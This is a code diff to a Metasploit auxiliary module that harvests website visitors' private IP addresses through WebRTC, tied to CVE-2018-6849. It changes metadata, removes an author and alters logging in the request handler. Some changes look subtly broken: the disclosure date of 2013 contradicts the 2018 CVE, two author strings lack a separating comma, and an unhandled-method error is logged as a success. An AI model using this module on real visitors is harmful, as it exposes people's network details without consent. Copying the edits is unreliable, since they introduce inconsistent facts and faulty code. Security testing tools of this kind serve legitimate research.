@@ -10,13 +10,13 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => "Private IP Leakage to WebPage using WebRTC Function.",
-        'Description'    => %q(
-          This module exploits a vulnerability in browsers using well-known property of WebRTC (Web Real-Time Communications) which enables Web applications and sites to capture or exchange arbitrary data between browsers without requiring an intermediary.
-        ),
+        'Name'           => "Private IP Leakage to WebPage using WebRTC Function",
+       'Description'    => %q{
+        This module uses WebRTC component to gather complete client information and browser can
+        disclose a private IP address in a STUN request.
+      },
         'License'        => MSF_LICENSE,
         'Author'         => [
-          'Brendan Coles', #MSF Module
           'Dhiraj Mishra'  #MSF Module
           'Daniel Roesler'  #JS Code
         ],
@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', '2018-6849' ],
           ['URL', 'https://datarift.blogspot.in/p/private-ip-leakage-using-webrtc.html']
         ],
-        'DisclosureDate' => 'Jan 26 2018',
+        'DisclosureDate' => 'Sep 5 2013',
         'Actions'        => [[ 'WebServer' ]],
         'PassiveActions' => [ 'WebServer' ],
         'DefaultAction'  => 'WebServer'
@@ -130,13 +130,13 @@ getIPs(function(ip){
   def on_request_uri(cli, request)
     case request.method.downcase
     when 'get'
-      print_status("#{cli.peerhost}: Sending response (#{@html.size} bytes)")
+      print_good("#{cli.peerhost}: Sending response (#{@html.size} bytes)")
       send_response(cli, @html)
     when 'post'
-      print_status("#{cli.peerhost}: Received reply:")
+      print_good("#{cli.peerhost}: Received reply:")
       puts request.to_s
     else
-      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
+      print_good("#{cli.peerhost}: Unhandled method: #{request.method}")
     end
   end
 end
